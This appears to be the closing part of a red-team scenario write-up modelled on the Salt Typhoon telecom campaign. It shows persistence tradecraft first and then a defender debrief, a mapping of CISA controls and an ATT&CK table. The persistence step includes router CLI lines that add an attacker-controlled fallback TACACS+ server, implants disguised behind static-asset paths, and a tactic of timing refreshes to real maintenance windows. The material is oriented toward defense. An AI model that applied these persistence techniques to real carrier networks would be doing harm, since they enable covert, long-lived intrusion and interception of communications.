**ATT&CK Tactic:** Persistence (TA0003), Defense Evasion (TA0005)
**Techniques:** Modify System Image (T1601), Pre-OS Boot (T1542), Valid Accounts (T1078)

### Objective

Ensure that the loss of any single foothold does not collapse the campaign. Salt Typhoon-class operators distribute persistence across geographically diverse devices and across vendor platforms — so that a Cisco patch cycle, a Juniper firmware update, or a single device's decommission cannot eliminate access.

### Execution

```bash
# Step 1: Redundant implants on geographically diverse routers
# Operators select 5-10 routers spread across regions, never more than
# one per POP. Each receives the same BadCandy-family implant, configured
# with the same activation header but a different listening URI:
#   /static/css/app-v2.css        -> implant A (POP East)
#   /static/js/vendor-bundle.js   -> implant B (POP Central)
#   /assets/img/logo-banner.png   -> implant C (POP West)
# The URIs match real static asset paths the WMA serves, so a defender
# probing the path sees a normal-looking response unless they also send
# the activation header.

# Step 2: Cross-vendor persistence
# Implants are deployed alongside on Juniper MX edge devices via a
# separate technique (out of scope here — Junos persistence is its own
# tradecraft). The point is that a Cisco-only response will not evict
# the campaign.

# Step 3: AAA-layer persistence
# Operator adds a TACACS+ server entry to a small population of devices
# pointing at attacker-controlled TACACS+:
target# tacacs server BACKUP-AAA
target#   address ipv4 10.88.88.88
target#   key REDACTED
# This server is configured as a fallback. It is only consulted when
# the primary TACACS+ is unreachable. The operator can force
# unreachability later by issuing a targeted action against the
# primary, at which point the device authenticates the operator's
# account against the attacker-controlled TACACS+. This is a "dead
# man's switch" — passive until needed.

# Step 4: Faked vendor maintenance windows for re-deploy
# When implants need refresh (patched image rolled out, device replaced),
# the operator times the refresh to coincide with a real maintenance
# window. Carriers publish their change calendars internally; operators
# read them from NOC ticketing systems and align their refresh activity
# with the window so that NOC engineers see the refresh as part of the
# ticket they are already working.
```

---

## Defender Debrief

### What Should Have Been Caught — and When

| Phase | What Defenders Should Have Seen | Detection Gap | Verdict |
| --- | --- | --- | --- |
| Recon | Shodan / Censys queries against carrier prefixes; LinkedIn enumeration of NOC engineers | Outside the perimeter, no logs | Missed — expected |
| IOS-XE Initial Access | Mass-exploitation news for CVE-2023-20198 from October 2023 should have triggered an immediate inventory of internet-exposed IOS-XE Web UI | Inventory accuracy depends on configuration-drift monitoring not present at most carriers | Likely missed at carriers without active CMDB-to-device reconciliation |
| Lateral Movement to NOC | TACACS+ accounting logs would show an MSP service account authenticating from an unfamiliar source IP | TACACS+ accounting is verbose; most carriers do not alert on it | Likely missed |
| OSS/BSS Access | Ericsson ENM has audit logging; queries to subscriber-affecting NEs are recorded | Audit logs are reviewed only on customer complaint, not in real-time | Missed |
| LIAF Access | LIAF audit log records every intercept-list query and every provisioning change | The audit log is the highest-fidelity evidence — but the operator's blend-with-real-case-IDs tactic specifically defeats audit review | The single most important detection point; possible catch only with anomaly-detection layered on the audit log |
| SS7 Signaling Abuse | SS7 firewalls (AdaptiveMobile, Mobileum, P1 Security) explicitly detect SRI-SM / ATI / update-location anomalies | Most US Tier-1 carriers do not have SS7 firewalls deployed | Missed at most carriers; caught at the few that have invested |
| NetFlow Collector Addition | Configuration-drift monitoring on routers would flag the addition of an extra exporter | Configuration-drift monitoring at the per-line level is rare; most carriers compare templates, not lines | Missed |
| Long-Dwell Exfiltration | NetFlow asymmetry — traffic sourced from carrier IPs to an external ASN with no corresponding customer-service association | Detection requires correlation of routing/subscriber state with NetFlow source IPs; few SOCs are equipped for this | Likely missed |

### Why Corporate-Tier EDR Is Irrelevant Here

CrowdStrike Falcon, the corporate-tier endpoint detection capability TitanCarrier runs, is deployed on Windows and macOS workstations. The action in this scenario happens on Cisco IOS-XR / IOS-XE, Ericsson ENM hosts, Oracle SBC, NOC Linux jump hosts, and the LIAF — none of which run a corporate-EDR agent. There is no "endpoint" in the conventional sense to instrument. The carrier's investment in corporate EDR provides excellent protection against the spearphishing-and-laptop intrusion model that APT29 uses, and approximately zero protection against the network-and-routing intrusion model that Salt Typhoon uses.

This is not a CrowdStrike critique — it is a category-of-tool observation. Network gear requires network-gear-native detection: device-level memory imaging tools, IOS-XR / IOS-XE behavioral telemetry, AAA log analysis, configuration-drift monitoring, and SS7/Diameter firewalls. These are separate products, separate teams, and separate budgets from the corporate SOC.

### NetFlow Asymmetry That Should Have Raised Flags

The most reliably detectable artifact of this campaign is the long-dwell exfiltration in Phase 7. The operator's in-carrier collector emits traffic from carrier-owned IPs to an external ASN. A correctly tuned NetFlow analytics layer would observe:

- Traffic sourced from IPs not associated with active customer service.
- Destination ASN not on the carrier's normal peering map for those source prefixes.
- A consistent diurnal pattern (always 03:00-04:00) inconsistent with customer behavior.
- Aggregate volume small but persistent over months — the opposite of typical exfiltration spikes.

The detection rule writes itself, but it requires a NetFlow analytics platform that knows the carrier's customer-prefix-to-service mapping. Building that mapping is large engineering work that does not show up on a security dashboard until it has paid off — which is exactly the kind of work that gets deferred.

### Blue Team Capability Gaps

The carrier-tier detection gaps illustrated by Salt Typhoon are systemic across the US Tier-1 population:

1. **Device-level forensics.** Most carriers cannot, on demand, capture a memory image of a running IOS-XR or IOS-XE device for forensic analysis. The vendor procedures exist but are rarely exercised; when they are needed during an incident, the carrier discovers it does not have the tooling or trained staff.
2. **IOS-XR / IOS-XE memory imaging on schedule.** Periodic baselining of device memory against expected state would detect BadCandy-family implants directly. Almost no carrier does this routinely.
3. **AAA log retention.** TACACS+ accounting logs are voluminous; many carriers retain only 30-90 days. Salt Typhoon-class dwell times exceed retention, so by the time investigation begins, the relevant logins have aged off.
4. **Configuration-drift monitoring at the line level.** Comparing every running-config diff against the expected template, line-by-line, daily, would have caught the additional NetFlow exporter and the additional TACACS+ server. The technology exists (Cisco DNAC config compliance, RANCID for the old-school) but coverage is partial.
5. **LIAF audit-log anomaly detection.** Treating the LIAF audit log as a SIEM source — with anomaly detection on case-ID provenance, requesting-agency consistency, and provisioning-pattern baselines — would catch the Phase 5 blend-with-real-cases tactic. Almost no carrier does this.
6. **SS7 / Diameter firewalls.** Off-the-shelf products from AdaptiveMobile, Mobileum, and P1 Security exist and are deployed widely outside the US. US Tier-1 deployment is incomplete.

### Specific CISA-Recommended Controls and Which Would Have Worked

The CISA/FBI/NSA joint cybersecurity advisory on PRC-affiliated activity against US telecom (published late 2024) enumerates specific recommendations. Mapping them against this scenario:

| CISA Recommendation | Phase It Addresses | Effective? |
| --- | --- | --- |
| Disable all non-essential management protocols (Telnet, HTTP, SNMP v1/v2c) | Phase 2, Phase 7 | Highly effective — would eliminate the IOS-XE Web UI exposure and the SNMP collection path |
| Restrict management access to dedicated out-of-band networks | Phase 2, Phase 3 | Highly effective — internet-reachable WMA is the entry point |
| Enforce multi-factor authentication for all network device administrative access | Phase 3 | Effective against stolen MSP credentials |
| Patch IOS-XE devices against CVE-2023-20198 / CVE-2023-20273 immediately | Phase 2 | Necessary; addresses the specific entry CVE chain |
| Implement strict configuration-drift monitoring with alerting on unexpected changes | Phases 3, 7, 8 | Highly effective — would catch the additional NetFlow exporter and additional TACACS+ server |
| Deploy SS7 / Diameter firewalls with policy enforcement | Phase 6 | Effective — explicitly detects the documented signaling-abuse patterns |
| Segment lawful-intercept administrative networks from operational networks | Phase 5 | Effective if executed strictly; the typical carrier deployment is "segmented" but not "isolated" |
| Centralize and retain network-device AAA logs in SIEM with anomaly detection | Phase 3 | Effective against MSP credential reuse from anomalous source IPs |

The honest summary: the CISA recommendations are correct, are not new, and were largely unimplemented at the publicly named victim carriers — which is how the campaign succeeded. The recommendations carry no new technology requirement; they require sustained engineering investment in network-operations security as a discipline distinct from corporate security.

---

## MITRE ATT&CK Summary

| Technique ID | Name | Phase Used |
| --- | --- | --- |
| T1595 | Active Scanning | Recon |
| T1596.001 | Search Open Technical Databases: DNS | Recon |
| T1596.002 | Search Open Technical Databases: WHOIS | Recon |
| T1589 | Gather Victim Identity Information | Recon |
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1078.004 | Valid Accounts: Cloud Accounts (supply chain) | Initial Access |
| T1059.008 | Command and Scripting Interpreter: Network Device CLI | Execution |
| T1552.001 | Unsecured Credentials: Credentials In Files | Credential Access |
| T1552.006 | Unsecured Credentials: Group Policy Preferences | Credential Access |
| T1550 | Use Alternate Authentication Material | Lateral Movement |
| T1021 | Remote Services | Lateral Movement |
| T1018 | Remote System Discovery | Discovery |
| T1046 | Network Service Discovery | Discovery |
| T1602.001 | Data from Configuration Repository: SNMP MIB Dump | Collection |
| T1213 | Data from Information Repositories | Collection |
| T1040 | Network Sniffing | Collection / Credential Access |
| T1557 | Adversary-in-the-Middle (signaling) | Phase 6 |
| T1098 | Account Manipulation (LIAF tap provisioning) | Persistence / Phase 5 |
| T1601 | Modify System Image (router implants) | Persistence / Phase 8 |
| T1601.001 | Modify System Image: Patch System Image | Defense Evasion |
| T1556.004 | Modify Authentication Process: Network Device Authentication | Defense Evasion / Phase 8 |
| T1562.001 | Impair Defenses: Disable or Modify Tools | Defense Evasion |
| T1572 | Protocol Tunneling | C2 |
| T1095 | Non-Application Layer Protocol | C2 |
| T1119 | Automated Collection | Long-Dwell Collection |
| T1029 | Scheduled Transfer | Exfiltration |
| T1048 | Exfiltration Over Alternative Protocol | Exfiltration |

## Key References

- [CISA Joint Cybersecurity Advisory — PRC-Affiliated Activity Targeting US Telecommunications (November 2024)](https://www.cisa.gov/news-events/cybersecurity-advisories)
- [Cisco PSIRT Advisory — CVE-2023-20198 IOS-XE Web UI Privilege Escalation](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z)
- [Cisco PSIRT Advisory — CVE-2023-20273 IOS-XE Command Injection](https://sec.cloudapps.cisco.com/security/center/publicationListing.x)
- [Trend Micro — Earth Estries / Salt Typhoon Activity Report](https://www.trendmicro.com/en_us/research.html)
- [Microsoft — GhostEmperor / Salt Typhoon analysis](https://www.microsoft.com/en-us/security/blog/)
- [Kaspersky GReAT — GhostEmperor Technical Report](https://securelist.com/)
- [Wall Street Journal — Salt Typhoon US Carrier Intrusion Disclosure (October 4 2024)](https://www.wsj.com/)
- [New York Times follow-up reporting on Salt Typhoon scope](https://www.nytimes.com/)
- [Wired follow-up reporting on Salt Typhoon and lawful intercept](https://www.wired.com/)
- [MITRE ATT&CK — Salt Typhoon group page](https://attack.mitre.org/groups/)
- [Communications Assistance for Law Enforcement Act (CALEA) — FCC overview](https://www.fcc.gov/calea)
